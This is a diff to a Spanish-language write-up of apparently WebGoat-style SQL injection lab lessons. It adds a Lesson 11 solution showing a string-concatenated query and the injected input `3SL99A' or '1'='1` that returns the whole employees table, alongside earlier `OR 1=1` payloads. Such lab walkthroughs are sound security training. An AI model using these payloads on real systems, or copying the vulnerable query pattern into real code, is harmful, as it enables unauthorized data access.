@@ -121,7 +121,6 @@ De esta forma, la consulta SQL inyectada sería:
 SELECT * FROM user_data WHERE last_name='Smith' OR 1=1
 ```
 
-
 ## Lesson 10
 
 ### Desarrollo
@@ -138,4 +137,28 @@ De esta forma, la consulta SQL inyectada sería:
 
 ```sql
 SELECT * FROM user_data WHERE Login_Count=1 OR '1'='1'
+```
+
+## Lesson 11
+
+### Desarrollo
+
+Debemos obtener la lista de usuarios completa inyectando una sentencia SQL.
+
+Disponemos de dos inputs de texto, uno para `last_name` y otro para `auth_tan`.
+
+Nuestra sentencia SQL es la siguiente:
+
+```sql
+"SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "'";
+```
+
+### Solución
+
+Si queremos obtener la lista completa de usurios debemos ingresar `Smith` en el campo `last_name` y `3SL99A' or '1'='1` para ejecutar la inyección SQL.
+
+De esta forma, la consulta SQL inyectada sería:
+
+```sql
+SELECT * FROM employees WHERE last_name='Smith' AND auth_tan='3SL99A' or '1'='1'
 ```
